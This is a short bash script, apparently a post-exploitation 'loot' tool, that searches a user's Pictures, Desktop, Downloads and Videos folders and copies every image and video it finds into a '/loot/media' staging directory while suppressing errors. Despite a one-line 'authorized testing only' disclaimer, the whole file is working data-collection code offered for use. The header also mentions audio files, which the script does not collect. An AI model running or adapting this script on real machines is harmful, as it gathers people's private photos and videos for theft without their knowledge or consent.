#!/bin/bash
# Media Collector - Images, videos, audio files
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] Media Collector"

DEST="/loot/media"
mkdir -p $DEST/{images,videos}

# Images
echo "[*] Collecting images..."
find ~/Pictures ~/Desktop ~/Downloads -type f \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" -o -name "*.gif" \) -size -50M -exec cp {} $DEST/images/ \; 2>/dev/null

# Videos
echo "[*] Collecting videos..."
find ~/Videos ~/Downloads -type f \( -name "*.mp4" -o -name "*.avi" -o -name "*.mov" \) -size -100M -exec cp {} $DEST/videos/ \; 2>/dev/null

IMG_COUNT=$(ls -1 $DEST/images 2>/dev/null | wc -l)
VID_COUNT=$(ls -1 $DEST/videos 2>/dev/null | wc -l)

echo "[+] Collected $IMG_COUNT images and $VID_COUNT videos"
